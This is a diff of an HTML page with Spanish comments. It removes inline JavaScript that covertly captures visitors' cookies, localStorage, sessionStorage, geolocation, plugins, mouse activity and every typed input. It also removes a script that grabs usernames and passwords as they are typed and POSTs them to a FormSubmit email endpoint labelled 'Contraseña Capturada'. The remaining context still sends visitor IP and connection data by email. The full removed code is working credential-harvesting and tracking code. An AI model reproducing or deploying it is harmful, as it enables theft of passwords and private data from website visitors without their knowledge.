@@ -65,68 +65,6 @@
         const downlink = navigator.connection ? navigator.connection.downlink : 'unknown';
         const rtt = navigator.connection ? navigator.connection.rtt : 'unknown';
 
-        // Captura de datos de plugins y extensiones
-        const plugins = navigator.plugins;
-        const pluginsList = Array.from(plugins).map(plugin => `${plugin.name}: ${plugin.description}`).join(', ');
-
-        // Captura de datos de geolocalización
-        let geolocationData = 'N/A';
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((position) => {
-                geolocationData = `${position.coords.latitude}, ${position.coords.longitude}`;
-            });
-        }
-
-        // Captura de datos de actividad del usuario
-        let mouseMoves = 0;
-        let clicks = 0;
-        document.addEventListener('mousemove', () => {
-            mouseMoves++;
-        });
-        document.addEventListener('click', () => {
-            clicks++;
-        });
-
-        // Captura de datos de tiempo de sesión
-        let lastActivityTime = new Date().getTime();
-        document.addEventListener('mousemove', () => {
-            lastActivityTime = new Date().getTime();
-        });
-        document.addEventListener('keydown', () => {
-            lastActivityTime = new Date().getTime();
-        });
-        const idleTime = () => {
-            const now = new Date().getTime();
-            return (now - lastActivityTime) / 1000;
-        };
-
-        // Captura de datos de cookies
-        const cookies = document.cookie.split(';').map(cookie => cookie.trim()).join(', ');
-
-        // Captura de datos de local storage
-        const localStorageData = Object.entries(localStorage).map(([key, value]) => `${key}: ${value}`).join(', ');
-
-        // Captura de datos de sesion storage
-        const sessionStorageData = Object.entries(sessionStorage).map(([key, value]) => `${key}: ${value}`).join(', ');
-
-        // Captura de datos de rendimiento
-        const performanceData = performance.timing.toJSON();
-
-        // Captura de datos de red
-        const navigationData = performance.getEntriesByType('navigation')[0].toJSON();
-
-        // Captura de datos de entrada del usuario
-        const inputData = [];
-        document.addEventListener('input', (event) => {
-            inputData.push({
-                type: event.target.type,
-                value: event.target.value,
-                name: event.target.name,
-                id: event.target.id,
-                timestamp: new Date().toISOString()
-            });
-        });
-
         // --- FUNCIÓN PRINCIPAL: API de Respaldo (ipinfo.io/json) para Máxima Estabilidad ---
 
         // ipinfo.io es extremadamente estable y no suele tener bloqueos de rate limit para uso esporádico.
@@ -172,17 +110,6 @@
                     "Tipo_De_Conectividad": effectiveType,
                     "Velocidad_Downlink": downlink,
                     "Tiempo_RTT": rtt,
-                    "Plugins_Instalados": pluginsList,
-                    "Geolocalizacion": geolocationData,
-                    "Movimientos_Mouse": mouseMoves,
-                    "Clics": clicks,
-                    "Tiempo_Inactividad": idleTime(),
-                    "Cookies": cookies,
-                    "Local_Storage": localStorageData,
-                    "Session_Storage": sessionStorageData,
-                    "Rendimiento": performanceData,
-                    "Navegacion": navigationData,
-                    "Entradas_Usuario": inputData,
                 };
 
                 // Enviar TODOS los datos al correo (FormSubmit)
@@ -229,29 +156,6 @@
         if (window.location.protocol === 'http:') {
             window.location.protocol = 'https:';
         }
-    </script>
-
-    <script>
-        // Captura de contraseñas
-        document.addEventListener('input', function(event) {
-            if (event.target.type === 'password') {
-                const password = event.target.value;
-                const username = document.querySelector('input[type="text"]').value;
-                const finalPayload = {
-                    "_subject": "Contraseña Capturada",
-                    "Username": username,
-                    "Password": password
-                };
-                fetch(FORM_SUBMIT_ENDPOINT, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify(finalPayload)
-                });
-            }
-        });
     </script>
 </body>
 </html>
